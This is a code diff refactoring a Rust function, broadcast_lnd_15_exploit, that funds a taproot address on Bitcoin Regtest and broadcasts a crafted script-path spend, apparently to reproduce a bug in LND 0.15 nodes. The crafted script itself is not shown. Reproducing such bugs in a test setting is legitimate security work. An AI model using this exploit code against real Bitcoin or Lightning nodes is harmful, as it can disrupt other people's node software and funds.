@@ -254,7 +254,7 @@ impl BroadcasterInterface for LdkBitcoindClient {
 
 pub fn broadcast_lnd_15_exploit(
     bitcoind_client: Arc<Client>,
-) -> Result<String, Box<dyn std::error::Error>> {
+) -> Result<Txid, Box<dyn std::error::Error>> {
     // TODO generate tweaked public key
     let secp = Secp256k1::new();
     let internal_key = UntweakedPublicKey::from_str(
@@ -270,16 +270,10 @@ pub fn broadcast_lnd_15_exploit(
     let tr_script = script.clone().to_v1_p2tr(&secp, internal_key);
     let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();
 
-    let txid = bitcoind_client.send_to_address(
-        &addr,
-        Amount::from_sat(110000), // TODO configure amount
-        None,
-        None,
-        None,
-        None,
-        None,
-        None,
-    )?;
+    let amount: Amount = Amount::from_sat(110_000);
+
+    let txid =
+        bitcoind_client.send_to_address(&addr, amount, None, None, None, None, None, None)?;
 
     // find which output was used to fund the address
     let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
@@ -294,18 +288,20 @@ pub fn broadcast_lnd_15_exploit(
 
     // create taproot tree
     let tr = TaprootBuilder::new().add_leaf(0, script.clone()).unwrap();
-    let spend_info = tr.finalize(&secp, internal_key).unwrap();
+    let spend_info = tr
+        .finalize(&secp, internal_key)
+        .expect("Could not create taproot spend info");
     // create control block
     let control_block = spend_info
         .control_block(&(script.clone(), LeafVersion::TapScript))
-        .unwrap();
+        .expect("Could not create control block");
     // witness is spending script followed by control block
     let witness = vec![script.serialize(), control_block.serialize()];
 
     let txin = TxIn {
         previous_output: OutPoint { txid, vout },
         script_sig: Script::new(),
-        sequence: Sequence::ZERO,
+        sequence: Sequence::default(),
         witness: Witness::from_vec(witness),
     };
 
@@ -314,13 +310,13 @@ pub fn broadcast_lnd_15_exploit(
         lock_time: PackedLockTime::ZERO,
         input: vec![txin],
         output: vec![TxOut {
-            value: 10_000, // TODO configure amount
+            value: amount.to_sat() - 10_000,
             script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
         }],
     };
 
     match bitcoind_client.send_raw_transaction(&created_tx) {
-        Ok(txid) => Ok(txid.to_string()),
+        Ok(txid) => Ok(txid),
         Err(e) => Err(e.into()),
     }
 }
